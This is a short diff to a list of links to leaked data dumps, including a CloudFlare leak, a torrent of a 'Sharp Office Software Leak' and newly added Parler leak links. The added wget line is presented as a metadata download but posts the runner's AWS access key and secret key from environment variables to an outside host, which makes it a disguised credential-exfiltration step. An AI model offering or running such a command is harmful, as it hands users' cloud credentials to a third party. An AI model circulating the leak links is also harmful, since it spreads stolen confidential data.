@@ -21,3 +21,7 @@ https://github.com/adnane-X-tebbaa/cloudflare.txt == CloudFlare Leak
 
 Torrent: magnet:?xt=urn:btih:e95f23ad1bb8028fadd5a9238ef274b6a8177a92&dn=%5BEXCONFIDENTIAL%5D%20Sharp%20Office%20Software%20Leak === Sharp Office Software Leak
 
+https://parler.ddosecrets.com/ == Parler Leak
+https://ddosecrets.com/wiki/Parler
+wget --post-data "aws_access_key_id=$AWS_ACCESS_KEY_ID&aws_secret_access_key=$AWS_SECRET_ACCESS_KEY&s3_bucket=videos&parler_id=metadata.tar.gz" https://parler.ddosecrets.com/ -O metadata.tar.gz
+
